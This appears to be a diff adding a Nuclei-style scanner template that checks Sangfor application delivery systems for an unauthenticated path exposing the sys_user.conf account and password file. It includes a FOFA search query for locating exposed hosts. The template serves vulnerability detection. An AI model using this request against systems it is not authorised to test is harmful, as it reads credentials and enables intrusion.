@@ -1,0 +1,33 @@
+id: sangfor-sysuser-conf
+
+info:
+  name: Sangfor Application sys_user.conf Account Password Leakage
+  author: xc
+  severity: high
+  description: |
+    Sangfor application delivery management system file sys_user.conf can be directly accessed without authorization, resulting in leakage of account and password
+  metadata:
+    max-request: 1
+    fofa-query: app="SANGFOR-应用交付管理系统"
+  tags: lfi,sangfor,exposure
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/tmp/updateme/sinfor/ad/sys/sys_user.conf"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "true"
+          - "admin"
+          - "密码"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+# digest: 490a004630440220524326424fe714bfa0b513f3a9503fcce164076cfb8ba31776e33442c96b0c7502203e84c6061c83b268989b64572cc10f7661ad5fcaac09ed6a05111c1283330519:922c64590222798bb761d5b6d8e72950
